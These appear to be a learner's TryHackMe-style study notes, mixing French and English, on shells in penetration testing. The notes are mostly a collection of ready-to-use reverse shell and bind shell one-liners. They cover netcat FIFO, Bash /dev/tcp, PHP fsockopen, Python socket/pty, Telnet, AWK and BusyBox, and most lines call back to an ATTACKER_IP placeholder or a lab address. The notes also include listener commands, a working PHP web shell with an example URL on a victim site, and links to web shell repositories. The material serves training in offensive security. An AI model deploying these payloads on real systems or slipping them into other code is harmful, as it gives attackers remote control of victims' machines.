## **Definition**

**Shell = interface** pour interagir avec un OS (souvent **CLI**, parfois GUI), selon l’OS.

En cybersécurité : une **session de shell** obtenue sur une machine compromise permettant **d’exécuter des commandes/programmes**.

**À quoi ça sert (post-compromission)**
- **Contrôle à distance** : exécuter commandes/logiciels sur la cible.
- **Escalade de privilèges** : passer d’un accès limité à admin/root.
- **Exfiltration** : lire/copier des données sensibles.
- **Persistance** : créer des comptes/identifiants, déposer backdoor pour revenir plus tard.
- **Post-exploitation** : malware, comptes cachés, effacement de traces/infos.
- **Pivoting** : utiliser la machine compromise comme **relais** pour attaquer d’autres systèmes du réseau.

**À retenir**
- Un shell est souvent le **point de départ** : accès initial → exploration → élévation → mouvement latéral (pivot).

## **Reverse shell**

**Reverse shell = la cible initie la connexion vers l’attaquant** (“connect-back”).

Avantage : peut **contourner des firewalls** (trafic sortant souvent plus autorisé) et **se fondre** dans du trafic “normal”.

**How reverse shell work**

**commandes netcat**

|Élément|Signification|À quoi ça sert|
|---|---|---|
|`nc -lvnp 443`|Lance Netcat en écoute sur le port 443|Attend la connexion “reverse” de la cible|
|`-l`|listen|Se met en mode serveur (attend une connexion)|
|`-v`|verbose|Affiche plus d’infos (connexion, IP, port…)|
|`-n`|no DNS|Utilise des IP, pas de résolution DNS|
|`-p 443`|port|Port sur lequel Netcat écoute|
|Ports “blend”|`53, 80, 8080, 443, 139, 445`|Ports “habituels” pour se fondre dans du trafic légitime|

**Payload reverse shell**

**But :** obtenir un **shell interactif à distance** : la sortie du shell part vers l’attaquant, et les commandes tapées par l’attaquant reviennent au shell (**2 sens**).

**Exemple (FIFO / pipe reverse shell)**

- **FIFO (named pipe)** = “fichier-tuyau” créé avec `mkfifo` :  
    un processus **écrit**, un autre **lit** en continu.

- Dans ce payload, le FIFO sert de **tampon/pont** pour relier :
    - **entrée du shell** ← commandes venant de l’attaquant
    - **sortie + erreurs du shell** → renvoyées vers l’attaquant via `nc`

**Payload :**

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

|Morceau|Rôle|Pourquoi c’est utile|
|---|---|---|
|`rm -f /tmp/f`|Supprime `/tmp/f` s’il existe déjà|Évite un conflit si le FIFO existe|
|`mkfifo /tmp/f`|Crée un **named pipe (FIFO)**|Permet de faire circuler l’entrée/sortie entre processus|
|`cat /tmp/f`|Lit en continu ce qui arrive dans le FIFO|Récupère les commandes à exécuter|
|`\| sh -i 2>&1`|Lance un shell interactif, inclut stderr dans stdout|Permet exécution interactive + retour des erreurs|
|`\| nc IP PORT >/tmp/f`|Envoie la sortie au listener **et** réinjecte l’entrée vers le FIFO|Assure la **communication bidirectionnelle** (2 sens)|

**Résultat côté attaquant**

- quand le payload est exec, l'attaquant reçoit un reverse shell
- Le listener affiche une connexion entrante : `connect to [attacker_ip] from [target_ip] ...`
- Tu obtiens un prompt sur la machine compromise (ex: `target@tryhackme:~$`).
```terminal
attacker@kali:~$ nc -lvnp 443 
listening on [any] 443 ... 
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964 
To run a command as administrator (user "root"), use "sudo ". 
See "man sudo_root" for details. 

target@tryhackme:~$
```

## **Bind shell**

**Bind shell = la cible ouvre (bind) un port et écoute**, puis l’attaquant **se connecte** à ce port.

- Utile si la cible **bloque les connexions sortantes**.
- Moins populaire : le port en écoute peut **être détecté** (service qui “reste up”).

---

**Setup sur la cible (payload bind shell)**

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

**Idée :** même logique FIFO que le reverse shell, sauf que **nc écoute sur la cible**.

- `nc -l 0.0.0.0 8080` : écoute sur **toutes interfaces** (0.0.0.0), port **8080**.
- Note : **ports < 1024 ⇒ privilèges élevés** (root) → 8080 évite ça.

---

**Connexion côté attaquant**

- `nc -nv TARGET_IP 8080`
    - `-n` : pas de DNS
    - `-v` : verbose

- Une fois connecté → tu récupères un prompt sur la cible (ex `target@tryhackme:~$`).

## **Shell listeners**

Netcat peut servir de listener, mais d’autres outils offrent **meilleure interaction** ou **options avancées**.

**Rlwrap**

- Petit outil basé sur **GNU readline** → apporte **édition**, **historique**, **touches fléchées**.
- Usage :
    - `rlwrap nc -lvnp 443`
- But : rendre un shell netcat **plus confortable** (arrow keys + history).

---

**Ncat (Nmap)**

- Version améliorée de netcat (projet **Nmap**) + features en plus, dont **SSL**.
- Listener standard :
    - `ncat -lvnp 4444`
- Listener chiffré :
    - `ncat --ssl -lvnp 4444`
- `--ssl` : active le **chiffrement SSL** (peut générer une clé temporaire si rien n’est fourni).

---

**Socat**

- Outil “socket cat” : connecte **deux flux** (ex : réseau ↔ terminal).
- Listener simple :
    - `socat -d -d TCP-LISTEN:443 STDOUT`
    - `-d -d` : verbose (plus tu mets de `-d`, plus c’est verbeux)
    - `TCP-LISTEN:443` : écoute TCP sur 443
    - `STDOUT` : affiche les données reçues dans le terminal.


## **Shell payloads**

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.
#### Bash

**Normal Bash Reverse Shell**

```shell-session
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (**ATTACKER_IP**) on port `443`. The `>&` operator combines both standard output and standard error.

---

**Bash Read Line** **Reverse Shell**

```shell-session
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

This reverse shell creates a new file descriptor (`5` in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

---

**Bash With File Descriptor 196** **Reverse Shell**

```shell-session
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

This reverse shell uses a file descriptor (`196` in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

---

**Bash With File Descriptor 5** **Reverse Shell**

```shell-session
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Similar to the first example, this command opens a shell (`bash -i`), but it uses file descriptor `5` for input and output, enabling an interactive session over the TCP connection.

---
#### PHP

**PHP Reverse Shell Using the exec Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

This reverse shell creates a socket connection to the attacker's IP on port `443` and uses the `exec` function to execute a shell, redirecting standard input and output.

---

**PHP Reverse Shell Using the shell_exec Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

Similar to the previous command, but uses the `shell_exec` function.

---

**PHP Reverse Shell Using the system Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```

This reverse shell employs the `system` function, which executes the command and outputs the result to the browser.

---

**PHP Reverse Shell Using the passthru Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

The `passthru` function executes a command and sends raw output back to the browser. This is useful when working with binary data.

---  

**PHP Reverse Shell Using the popen Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```

This reverse shell uses `popen` to open a process file pointer, allowing the shell to be executed.

---
### Python

Please note, the following snippets below require using `python -c` to run, indicated by the placeholder PY-C  

---

**Python Reverse Shell by Exporting Environment Variables**

```shell-session
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

---

**Python Reverse Shell Using the subprocess Module**

```shell-session
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

This reverse shell uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.  

---

**Short Python Reverse Shell**

```shell-session
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

This reverse shell creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`.

---
#### Others  

**Telnet**

```shell-session
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

This reverse shell creates a named pipe using `mkfifo` and connects to the attacker via Telnet on IP `ATTACKER_IP` and port `443`. 

---

**AWK**

```shell-session
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTACKER_IP:443`. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

---

**BusyBox**

```shell-session
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```

This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.

## **Web Shell**

**Web shell** : script (sur un serveur web compromis) qui **exécute des commandes via le serveur web**. Souvent **un fichier unique** qui gère **exécution de commandes + manipulation de fichiers**. Peut être **caché dans une appli/service web**, donc **difficile à détecter** et **très utilisé** par les attaquants.

**Langages courants** : ceux supportés par les serveurs web (**PHP, ASP, JSP, CGI**, etc.).

---

**exemple php web shell**

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The above shell can be saved into a file with the PHP extension, like `shell.php`, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as [Unrestricted File Upload](https://tryhackme.com/r/room/uploadvulns), [File Inclusion](https://tryhackme.com/r/room/fileinc), [Command Injection](https://tryhackme.com/r/room/oscommandinjection), among others, or by gaining unauthorized access to it.

After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in `shell.php`, we need to provide a GET method and the value of the variable `cmd`, which should contain the command the attacker wants to execute. For example, if we want to execute the command **whoami** the request to the URL should be:

http://victim.com/uploads/shell.php?cmd=whoami

The above will execute the command **whoami** and display the result in the web browser.

### **Existing web shells available online**

The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. Let's explore some of the most popular web shells that can be found online

- [p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution.
- [b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
- [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.

You can find more web shells at: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).

## **Cheat sheet (reverse shell)**

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Suite :  [Unrestricted File Upload](https://tryhackme.com/r/room/uploadvulns), [File Inclusion](https://tryhackme.com/r/room/fileinc), [Command Injection](https://tryhackme.com/r/room/oscommandinjection)


